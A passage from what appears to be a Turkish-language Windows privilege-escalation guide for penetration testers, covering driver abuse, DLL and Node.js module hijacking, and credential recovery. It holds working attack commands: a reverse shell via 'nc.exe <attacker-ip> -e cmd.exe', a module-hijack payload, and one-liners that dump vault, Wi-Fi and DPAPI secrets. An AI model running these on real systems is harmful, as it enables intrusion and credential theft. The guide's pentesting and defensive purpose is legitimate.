// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Geliştiriciler için azaltma önlemleri
- DACL ile kısıtlanması amaçlanan aygıt nesnelerini oluştururken her zaman FILE_DEVICE_SECURE_OPEN ayarını yapın.
- Ayrıcalıklı işlemler için çağıran bağlamını doğrulayın. İşlemin sonlandırılmasına veya handle döndürülmesine izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTL'leri kısıtlayın (erişim maskeleri, METHOD_*, girdi doğrulaması) ve doğrudan kernel ayrıcalıkları yerine brokered modelleri değerlendirin.

Savunmacılar için tespit fikirleri
- Şüpheli aygıt adlarının (ör. \\ .\\amsdk*) kullanıcı modundan açılmasını ve kötüye kullanıma işaret eden belirli IOCTL dizilerini izleyin.
- Microsoft’un güvenlik açığı bulunan sürücüler engelleme listesini (HVCI/WDAC/Smart App Control) zorunlu tutun ve kendi izin/engelleme listelerinizi güncel tutun.


## PATH DLL Hijacking

**PATH üzerindeki bir klasör içinde yazma izinleriniz** varsa, bir süreç tarafından yüklenen bir DLL’i ele geçirip **ayrıcalıklarınızı yükseltebilirsiniz**.<sup>[[2]](#references)</sup>

PATH içindeki tüm klasörlerin izinlerini kontrol edin:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Daha fazla bilgi için bu kontrolün nasıl istismar edileceğine bakın:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` üzerinden Node.js / Electron modül çözümleme hijacking'i

Bu, `require("foo")` gibi yalın bir import gerçekleştiren ve beklenen modülün **bulunmadığı** durumlarda **Node.js** ve **Electron** uygulamalarını etkileyen bir **Windows uncontrolled search path** varyantıdır.<sup>[[20]](#references)</sup>

Node, dizin ağacında yukarı doğru ilerleyerek her üst dizindeki `node_modules` klasörlerini kontrol eder. Windows'ta bu arama sürücü köküne kadar ulaşabilir; bu nedenle `C:\Users\Administrator\project\app.js` konumundan başlatılan bir uygulama şu yolları kontrol edebilir:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**Düşük ayrıcalıklı bir kullanıcı** `C:\node_modules` oluşturabiliyorsa kötü amaçlı bir `foo.js` (veya paket klasörü) yerleştirip **daha yüksek ayrıcalıklarla çalışan bir Node/Electron sürecinin** eksik bağımlılığı çözümlemesini bekleyebilir. Payload, kurban sürecinin güvenlik bağlamında çalışır. Bu nedenle hedef yönetici olarak, yükseltilmiş bir zamanlanmış görev/hizmet sarmalayıcısı üzerinden veya otomatik başlatılan ayrıcalıklı bir masaüstü uygulaması olarak çalışıyorsa bu durum **LPE**'ye dönüşür.

Bu durum özellikle şu koşullarda yaygındır:

- bir bağımlılık `optionalDependencies` içinde bildirilmişse<sup>[[22]](#references)</sup>
- üçüncü taraf bir kütüphane `require("foo")` çağrısını `try/catch` içine alıp hata durumunda çalışmaya devam ediyorsa
- bir paket production derlemelerinden kaldırılmışsa, paketleme sırasında atlanmışsa veya yüklenememişse
- güvenlik açığı barındıran `require()` çağrısı ana uygulama kodunda değil, bağımlılık ağacının derinlerinde bulunuyorsa

### Güvenlik açığı barındıran hedefleri arama

Çözümleme yolunu doğrulamak için **Procmon** kullanın:<sup>[[23]](#references)</sup>

- `Process Name` = hedef çalıştırılabilir dosya (`node.exe`, Electron uygulamasının EXE dosyası veya sarmalayıcı süreç) olarak filtreleyin
- `Path` alanında `node_modules` `contains` olacak şekilde filtreleyin
- `NAME NOT FOUND` sonuçlarına ve `C:\node_modules` altındaki son başarılı açılışa odaklanın

Açılmış `.asar` dosyalarında veya uygulama kaynaklarında aranabilecek kod inceleme örüntüleri:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### İstismar

1. Procmon veya kaynak incelemesiyle **eksik paket adını** belirleyin.
2. Henüz yoksa root lookup dizinini oluşturun:

```powershell
mkdir C:\node_modules
```

3. Beklenen tam adla bir modül bırakın:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Kurban uygulamayı tetikleyin. Uygulama `require("foo")` çağırır ve meşru modül mevcut değilse Node, `C:\node_modules\foo.js` dosyasını yükleyebilir.

Bu örüntüye uyan, gerçek dünyada eksik olan isteğe bağlı modüller arasında `bluebird` ve `utf-8-validate` bulunur; ancak yeniden kullanılabilir olan kısım **technique**’tir: ayrıcalıklı bir Windows Node/Electron sürecinin çözümleyeceği herhangi bir **bare import** bulun.

### Tespit ve güçlendirme önerileri

- Bir kullanıcı `C:\node_modules` oluşturduğunda veya buraya yeni `.js` dosyaları/paketleri yazdığında uyarı verin.
- `C:\node_modules\*` konumundan okuma yapan yüksek bütünlüklü süreçleri araştırın.
- Üretimde tüm çalışma zamanı bağımlılıklarını paketleyin ve `optionalDependencies` kullanımını denetleyin.
- Üçüncü taraf kodlarda sessiz `try { require("...") } catch {}` örüntülerini inceleyin.
- Kütüphane destekliyorsa isteğe bağlı kontrolleri devre dışı bırakın (örneğin bazı `ws` dağıtımları, `WS_NO_UTF_8_VALIDATE=1` ile eski `utf-8-validate` kontrolünü atlayabilir).

## Ağ

### Paylaşımlar

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts dosyası

hosts dosyasında sabit kodlanmış diğer bilinen bilgisayarları kontrol edin

```
type C:\Windows\System32\drivers\etc\hosts
```

### Ağ Arayüzleri ve DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Açık Portlar

Dışarıdan **kısıtlı hizmetleri** kontrol edin.

```bash
netstat -ano #Opened ports?
```

Yerel bir listener için PID'yi sürecin sahibi, çalıştırılabilir dosyanın yolu ve onu başlatan hizmet veya zamanlanmış görevle ilişkilendirin. Bir uzaktan kontrol hizmeti, yalnızca kimlik doğrulaması ve komut denetimleri izin veriyorsa masaüstü kullanıcısı olarak erişim sağlayabilir. Daha yüksek ayrıcalıklı bir hesapla çalışan özel bir TCP uygulaması ayrı bir inceleme hedefidir: listener ve ikili dosyanın yolu pasif ipuçlarıdır; kimliği doğrulanmış bir bellek bozulması yolunu değerlendirmek için söz konusu ikili dosyanın ve erişilebilir girdisinin analiz edilmesi gerekir. Açık bir portun bir sistem sürecine ait olduğu görünüyorsa, arka uç hizmetini bu sürece atfetmeden önce [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) çıktısıyla karşılaştırın; yalnızca bir yönlendirme kuralının bulunması, hedefe erişilebildiğini veya hedefin savunmasız olduğunu kanıtlamaz.

### Yönlendirme Tablosu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP Tablosu

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Güvenlik Duvarı Kuralları

[**Güvenlik Duvarı ile ilgili komutlar için bu sayfaya bakın**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listeleme, kural oluşturma, kapatma, kapatma...)**

Ağ keşfi için daha fazla [komut burada](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

İkili dosya `bash.exe`, `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` konumunda da bulunabilir.

root kullanıcısı olursanız herhangi bir portu dinleyebilirsiniz (bir portu dinlemek için `nc.exe`'yi ilk kez kullandığınızda, GUI üzerinden `nc`'nin güvenlik duvarı tarafından engellenmemesine izin verilip verilmeyeceği sorulur).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Root olarak bash'i kolayca başlatmak için `--default-user root` seçeneğini deneyebilirsiniz.

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe inceleyebilirsiniz.

WSL içindeki Linux `root` kullanıcısı tek başına Windows Administrator hakları sağlamaz. Mevcut Windows kimliği bir dağıtımın dosya sistemini okuyabiliyorsa, kimlik bilgilerini kaydetmiş olabilecek komutlar için kabuk geçmişi dosyalarını ( `/root/.bash_history` dahil) inceleyin; ancak yetki yükseltme için yine de geçerli, daha yüksek ayrıcalıklara sahip bir hesap ve izin verilen bir kimlik doğrulama yolu gerekir. `LocalState\rootfs` düzeni eski WSL kurulumları için geçerlidir; WSL 2 genellikle dağıtımını bir [`ext4.vhdx` sanal diskinde](https://learn.microsoft.com/en-us/windows/wsl/disk-space) saklar. Bu nedenle önce gerçek dağıtımı ve depolama yolunu belirleyin. Otomatik envanter çıkarma sırasında geçmiş içeriğini yazdırmaktan kaçının.

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Treat `DefaultUserName` ve `DefaultDomainName` değerlerini kimlik bilgileri değil, hesap bağlamı olarak değerlendirin. Boş olmayan bir `DefaultPassword` veya `AltDefaultPassword` değeri, kayıt defterinde düz metin olarak bulunan bir bulgudur. `AutoAdminLogon=1` olduğu hâlde okunabilir düz metin parola yoksa bu yalnızca bir ipucudur: [Sysinternals Autologon parolayı LSA secret olarak saklayabilir](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon) ve kayıt defterini normal şekilde okumak, bu secret'ın var olup olmadığını veya alınabilir durumda olup olmadığını kanıtlamaz. Kimlik bilgilerinin açığa çıktığını bildirmeden önce erişim haklarını ve gerçek oturum açma yapılandırmasını inceleyin.

### Credential Manager / Windows Vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault, **Windows**'un kullanıcıları **otomatik olarak oturum açtırmak** için kullanabileceği sunuculara, web sitelerine ve diğer programlara ait kullanıcı kimlik bilgilerini saklar. İlk bakışta bu, kullanıcıların Facebook, Twitter veya Gmail gibi siteler için kimlik bilgilerini saklayıp tarayıcıların otomatik olarak oturum açmasını sağlayabilecekleri anlamına geliyor gibi gelebilir; ancak sistem böyle çalışmaz.

Windows Vault, Windows'un kullanıcıları otomatik olarak oturum açtırabileceği kimlik bilgilerini saklar. Bunun anlamı, bir kaynağa (sunucuya veya web sitesine) erişmek için kimlik bilgilerine ihtiyaç duyan herhangi bir **Windows uygulamasının bu Credential Manager ve Windows Vault'tan yararlanabileceği** ve kullanıcılardan her seferinde kullanıcı adı ve parola girmelerini istemek yerine sağlanan kimlik bilgilerini kullanabileceğidir.

Uygulamalar Credential Manager ile etkileşim kurmadıkları sürece, belirli bir kaynak için saklanan kimlik bilgilerini kullanabileceklerini sanmıyorum. Dolayısıyla uygulamanız kasadan yararlanmak istiyorsa, varsayılan depolama kasasından o kaynağa ait kimlik bilgilerini almak için bir şekilde **credential manager ile iletişim kurup bu kimlik bilgilerini istemelidir**.

Makinede saklanan kimlik bilgilerini listelemek için `cmdkey` komutunu kullanın.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Ardından, kaydedilmiş kimlik bilgilerini kullanmak için `runas` komutunu `/savecred` seçeneğiyle kullanabilirsiniz. Aşağıdaki örnek, SMB paylaşımı üzerinden uzak bir binary'yi çağırıyor.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Belirtilen kimlik bilgileriyle `runas` kullanma.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) aracılığıyla da kullanılabileceğini unutmayın.

### UWP PasswordVault / Credential Locker

Modern Windows UWP uygulamaları, Microsoft Edge ve modern sistem hizmetleri; kimlik doğrulama token'larını ve plaintext parolaları Universal Windows Platform (UWP) `PasswordVault` içinde depolar (`vaultcmd` içinde `Web Credentials` olarak da görüntülenir). Bu depolama alanı oturumdan yalıtılmıştır ve yönetici veya `SeDebugPrivilege` hakları olmadan yerel olarak çözülebilir.

Depolanan tüm kullanıcı adlarını ve plaintext parolaları anında dump edip çözmek için bu PowerShell komutunu kullanıcının etkin oturumu içinde çalıştırın:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)**, verilerin simetrik şifrelenmesi için bir yöntem sağlar ve Windows işletim sistemi içinde çoğunlukla asimetrik özel anahtarların simetrik olarak şifrelenmesinde kullanılır. Bu şifreleme, entropiye önemli ölçüde katkıda bulunmak için bir kullanıcı veya sistem sırrından yararlanır.

**DPAPI, kullanıcının oturum açma sırlarından türetilen bir simetrik anahtar aracılığıyla anahtarların şifrelenmesini sağlar**. Sistem şifrelemesinin söz konusu olduğu senaryolarda, sistemin etki alanı kimlik doğrulama sırlarını kullanır.

DPAPI kullanılarak şifrelenen kullanıcı RSA anahtarları, `{SID}` kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değerini temsil ettiği `%APPDATA%\Microsoft\Protect\{SID}` dizininde saklanır. **Kullanıcının özel anahtarlarını koruyan ana anahtarla aynı dosyada bulunan DPAPI anahtarı**, genellikle 64 baytlık rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu, dolayısıyla CMD'de `dir` komutuyla içeriğinin listelenemediğini, ancak PowerShell üzerinden listelenebildiğini unutmayın.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

**mimikatz module** `dpapi::masterkey` komutunu, şifresini çözmek için uygun argümanlarla (`/pvk` veya `/rpc`) kullanabilirsiniz.

**Ana parola tarafından korunan kimlik bilgileri dosyaları** genellikle şu konumda bulunur:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

You can use **mimikatz module** `dpapi::cred` with the appropriate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Kimlik Bilgileri

**PowerShell credentials** genellikle **scripting** ve otomasyon görevlerinde, şifrelenmiş kimlik bilgilerini kolayca saklamak için kullanılır. Kimlik bilgileri **DPAPI** kullanılarak korunur; bu da genellikle yalnızca oluşturuldukları bilgisayardaki aynı kullanıcı tarafından çözülebilecekleri anlamına gelir.

Dışa aktarılan bir kimlik bilgisi rastgele bir dosya adına veya `.xml` yoluna sahip olabilir. Bir script veya dosya envanteri böyle bir dosyaya işaret ettiğinde, `C:\Users` varsaymak yerine hesabın gerçek profil dizinini bulun: [Windows profilleri başka konumlara yerleştirebilir](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Bir dosyanın okunabilir olması yalnızca bir ipucudur; [Windows `Export-Clixml`, şifrelenmiş bir kimlik bilgisini dışa aktaran kullanıcıya ve bilgisayara bağlar](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml) ve bulunan herhangi bir hesabın hedef hizmette geçerli haklara sahip olması ayrıca gerekir. Rutin envanter çıkarma sırasında şifrelenmiş veya düz metin değerlerini yazdırmadan önce yolları ve ACL'leri inceleyin.

Bir dosyada bulunan PS credentials bilgisini **decrypt** etmek için şunu yapabilirsiniz:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Kaydedilmiş RDP Bağlantıları

Bunları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers` altında bulabilirsiniz.

### Son Çalıştırılan Komutlar

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Uzak Masaüstü Kimlik Bilgisi Yöneticisi**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

**Mimikatz** `dpapi::rdg` modülünü uygun `/masterkey` ile kullanarak **herhangi bir .rdg dosyasının şifresini çözün**\
Mimikatz `sekurlsa::dpapi` modülüyle bellekten **çok sayıda DPAPI masterkey çıkarabilirsiniz**

**mRemoteNG farklı bir connection store kullanır.** `%APPDATA%\mRemoteNG` ve kullanıcının Documents klasöründeki, `config.xml` gibi sıradan adlara sahip dosyalar da dahil olmak üzere okunabilir XML dosyalarını inceleyin. Bir XML dosyasını credential adayı olarak değerlendirmeden önce connection şemasını ve şifrelenmiş `Password` özniteliklerini belirleyin. Saklanan değer, DPAPI/RDCMan parolası değildir; kurtarma, dosyanın şifreleme ayarlarına ve özel bir master password kullanılıp kullanılmadığına bağlıdır. Geniş kapsamlı tarama sırasında şifrelenmiş değerleri yazdırmaktan kaçının.

**Remote Desktop Plus profil dışa aktarımları** da kullanıcı dizinlerinde veya paylaşılan bir yönetim klasöründe okunabilir durumda olabilir. Eski bir `profiles.xml` dışa aktarımında `ProfileName`, `Password` ve `Secure` öğelerini içeren `Data/Profile` kayıtları bulunur. Boş olmayan bir parola öğesini credential adayı olarak değerlendirin; ancak bu değeri yazdırmayın veya düz metin olduğunu varsaymayın: [üretici notlarına](https://www.donkz.nl/) göre profil koruması, profili oluşturan hesaba ve bilgisayara bağlanabilir veya daha gevşek yapılandırılabilir. Bu bilgiye güvenmeden önce dosyanın kaynağını ve kurtarma koşullarını doğrulayın.

### Sticky Notes

Kullanıcılar bazen Sticky Notes uygulamalarına parolalar ve diğer bilgileri kaydeder. Microsoft'un paketlenmiş Sticky Notes uygulaması genellikle notları `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda saklar; eski veya farklı uygulamalar, LevelDB dahil, başka kullanıcı profili depoları kullanabilir. SQLite dosyasının bulunmamasını notların olmadığı şeklinde değerlendirmeden önce yüklü uygulamayı ve depolama biçimini belirleyin.

Sticky Notes SQLite write-ahead logging kullanıyorsa, yalnızca `plum.sqlite` dosyasının bir kopyasını almak, en son commit edilmiş notları içermeyebilir. Veritabanının tutarlı bir kopyasıyla eşleşen `plum.sqlite-wal` dosyasını da saklayın ve mevcutsa `plum.sqlite-shm` dosyasını da ekleyin; shared-memory dizini yeniden oluşturulabilir, ancak WAL veritabanının kalıcı durumunun bir parçasıdır. Bkz. [SQLite'ın WAL belgeleri](https://www.sqlite.org/wal.html). Hesap adı veya parola içeren bir not yalnızca credential adayıdır: hesabı, izin verilen erişimi ve parola tekrar kullanımını ayrı ayrı doğrulayın. Şifrelenmiş bir parola yöneticisi kaydının daha yüksek ayrıcalıklı bir oturum açmayı kanıtlayabilmesi için ayrıca gerçek şifre çözme anahtarı ve uygulamaya özgü yorumlama gerekir.

### AppCmd.exe

**AppCmd.exe'den parolaları kurtarmak için Administrator olmanız ve High Integrity level altında çalıştırmanız gerektiğini unutmayın.**\
**AppCmd.exe**, `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Bu dosya varsa bazı **kimlik bilgilerinin** yapılandırılmış ve **kurtarılabilir** olması mümkündür.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) içinden alınmıştır:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının mevcut olup olmadığını kontrol edin .\
Yükleyiciler **SYSTEM ayrıcalıklarıyla çalıştırılır**, birçoğu **DLL Sideloading'e karşı savunmasızdır (Bilgi kaynağı:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Files and Registry (Kimlik Bilgileri)

### Support-tool registry kimlik bilgisi kalıntıları

Bazı eski uzak destek kurulumları, sabit uygulama registry anahtarları altında parola ile ilgili değer adlarını tutar. Örneğin, [vendor'ın registry anahtarı açıklamasına](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) göre TeamViewer'ın `SecurityPasswordAES` değeri, 9'dan önceki sürümlerde yapılandırılmış statik oturum parolasını tanımlıyordu. Bir değer adı işareti yalnızca inceleme için bir ipucudur: Bu kimlik bilgisini değerlendirirken yüklü sürümü, okunabilir değer verisini, biçimi ve mevcut kimlik doğrulama davranışını doğrulayın. Uzak destek parolasından daha ayrıcalıklı bir Windows hesabına geçiş için ayrıca parolanın gerçekten yeniden kullanılıyor olması ve bu hesap için yetkilendirme gerekir. Şifreli verileri ve kurtarılan parolaları rutin envanter çıktısına dahil etmeyin.

### Korunan sayfalara sahip paylaşılan elektronik tablolar

Okunabilir bir paylaşılan çalışma kitabının hesap verisi içerdiğinden şüpheleniliyorsa **dosya şifrelemesini**, çalışma sayfası korumasından veya gizli sütunlardan ayırın. [Microsoft'un belirttiğine göre](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) çalışma sayfası koruması düzenlemeyi kontrol eder ve bir güvenlik özelliği değildir; tek başına çalışma kitabı içeriğinin şifrelendiğini göstermez. Yalnızca yetkili ve ilgili dosyaları inceleyin; geniş kapsamlı envanter sırasında olası gizli bilgileri yazdırmaktan kaçının. Okunabilir bir `.xlsx` yolu, korumalı bir sayfa veya gizli bir sütun tek başına kimlik bilgilerinin bulunduğunu ya da herhangi bir hesabın daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz; gerçek verileri ve mevcut hesap haklarını ayrı ayrı doğrulayın.

### CI server'da saklanan değişiklik yamaları

Bir CI server, derleme bittikten sonra bile gönderilen kaynak değişikliklerini kendi veri dizininde tutabilir. [TeamCity,](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` dizinini uzak çalıştırma değişikliklerinin depolandığı yer olarak belgeliyor; veri dizini yapılandırılabilir ve mutlaka `ProgramData` altında bulunmaz. Okunabilir bir yama; kimlik bilgisi dosyasına, şifreleme anahtarına veya ikisini kullanan bir betiğe yapılan eklenmiş ya da kaldırılmış başvuruları koruyabilir. Örneğin, PowerShell'deki `ConvertTo-SecureString -Key` iş akışı için AES anahtarının yanı sıra şifrelenmiş dizge de gerekir; [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) anahtarın ayrıca sağlandığını belgeliyor. Önce yalnızca erişilebilir yama adlarını inceleyin; ardından rutin envanter çıktısına gizli bilgileri yazdırmadan, ilgili içeriği yetki dahilinde inceleyin. Bir yama yolu, şifrelenmiş bir değer veya anahtar başvurusu tek başına geçerli bir kimlik bilgisini ya da daha yüksek ayrıcalıklı erişimi kanıtlamaz. Veri dizini ACL'lerini kısıtlayın ve derleme değişikliklerine gizli bilgi eklemekten kaçının.

### Özel yerel yönetici parolası rotasyonu

Şirket içinde geliştirilmiş bir parola rotator'ı, şifrelenmiş yerel yönetici parolasını yerel bir serviste saklarken datastore kimlik bilgilerini okunabilir bir `.env` dosyasında veya updater ikilisinin yanında tutabilir. Updater'ın scheduled task'ını, hesabını, yapılandırma ACL'lerini, listener'ını ve datastore izinlerini birlikte inceleyin. Yalnızca loopback'e bağlı bir datastore'a, geçerli kimlik bilgilerine sahip yerel bir kullanıcı yine de erişebilir; ancak kimlik doğrulama tek başına ilgili kayıtları okuma izninin olduğunu kanıtlamaz. Şifreleme seed'i veya anahtar materyali şifreli verinin yanında erişilebiliyorsa, şifrelemeye güvenmeden önce kullanılan tam anahtar türetme yöntemini inceleyin. Go'nun [`math/rand`](https://pkg.go.dev/math/rand) paketini kullanarak açıkta olan bir seed'den deterministik biçimde AES anahtarı türeten bir şema, bu parolayı korumak için uygun değildir; Go, bu paketin güvenlik açısından hassas rastgelelik için uygun olmadığını belgeliyor. Kurtarılan bir parolayı ayrıcalık yükseltme yolu olarak değerlendirmeden önce, parolanın güncel olduğunu ve yerel Administrators grubu hesabına ait olduğunu doğrulayın. Scheduled task, `.env` yolu veya şifrelenmiş blob tek başına bu koşulların hiçbirini 